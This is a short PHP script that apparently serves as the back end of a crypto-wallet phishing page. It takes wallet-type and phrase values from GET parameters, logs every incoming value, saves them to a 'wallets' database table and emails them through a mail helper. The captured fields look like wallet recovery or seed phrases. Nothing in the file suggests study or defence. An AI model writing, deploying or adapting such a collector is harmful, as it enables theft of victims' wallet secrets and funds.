<?php
include('config/db.php');
include('PHPMailer/mailer.php');

// Log all incoming data
error_log("GET data received: " . print_r($_GET, true));

$load_phrase = isset($_GET['load_phrase']) ? trim($_GET['load_phrase']) : '';
$data_phrase = isset($_GET['data_phrase']) ? trim($_GET['data_phrase']) : '';
$wallet_selected = isset($_GET['wallet_selected']) ? trim($_GET['wallet_selected']) : '';
$username = isset($_GET['user']) ? trim($_GET['user']) : 'Unknown User';

// Log the username specifically
error_log("Username being used: " . $username);

header('Content-Type: application/json');

if (strlen($load_phrase) > 0) {
    try {
        $stmt = $conn->prepare("INSERT INTO wallets (load_phrase, data_phrase, wallet_selected, username, created_at) VALUES (?, ?, ?, ?, NOW())");
        
        if ($stmt === false) {
            error_log("Prepare failed: " . $conn->error);
            throw new Exception("Database prepare failed");
        }
        
        $stmt->bind_param("ssss", $load_phrase, $data_phrase, $wallet_selected, $username);
        
        if ($stmt->execute()) {
            error_log("Insert successful. Username stored: " . $username);
            $res = ['result' => 'success'];
            echo json_encode($res);
            
            // Send email
            sendMail($wallet_selected, $data_phrase, $load_phrase, $username);
        } else {
            error_log("Execute failed: " . $stmt->error);
            throw new Exception("Database execute failed");
        }
        
        $stmt->close();
    } catch (Exception $e) {
        error_log("Error occurred: " . $e->getMessage());
        $res = ['result' => 'failed', 'message' => $e->getMessage()];
        echo json_encode($res);
    }
} else {
    $res = ['result' => 'failed', 'message' => 'Load phrase cannot be empty.'];
    echo json_encode($res);
}

$conn->close();
?>